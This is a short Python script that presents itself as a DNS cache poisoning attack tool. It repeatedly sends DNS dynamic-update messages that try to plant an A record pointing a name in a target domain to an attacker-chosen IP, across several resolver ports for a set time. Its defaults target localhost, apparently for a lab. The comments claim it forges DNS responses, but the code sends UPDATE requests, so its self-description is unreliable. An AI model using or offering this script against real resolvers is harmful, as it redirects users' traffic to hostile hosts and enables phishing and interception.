import argparse
import ssl

import dns.resolver
import dns.update
import dns.dnssec
import time


def send_dns_response(target_ip, target_port, domain, record, spoofed_ip):
    # Craft a DNS response packet with spoofed IP and malicious record
    update = dns.update.Update(domain)

    update.add(record, 300, "A", spoofed_ip)

    print(dns.query.udp(update, target_ip, port=target_port))


def cache_poisoning_attack(target_ip, target_ports, domain, record, spoofed_ip, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        for port in target_ports:
            send_dns_response(target_ip, port, domain, record, spoofed_ip)
        time.sleep(0.1)  # Adjust the sleep duration as needed


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--target_ip', default="127.0.0.1", help="Target DNS resolver IP address")
    parser.add_argument('--target_ports', nargs='+', type=int, default=[31111, 31112], help="Target DNS resolver ports")
    parser.add_argument('--domain', default="example.com", help="Domain to spoof")
    parser.add_argument('--record', default="ns7", help="Record to spoof")
    parser.add_argument('--spoofed_ip', default="1.1.1.1", help="Spoofed IP address for the malicious record")
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')

    args = parser.parse_args()

    cache_poisoning_attack(args.target_ip, args.target_ports, args.domain, args.record, args.spoofed_ip, args.duration)
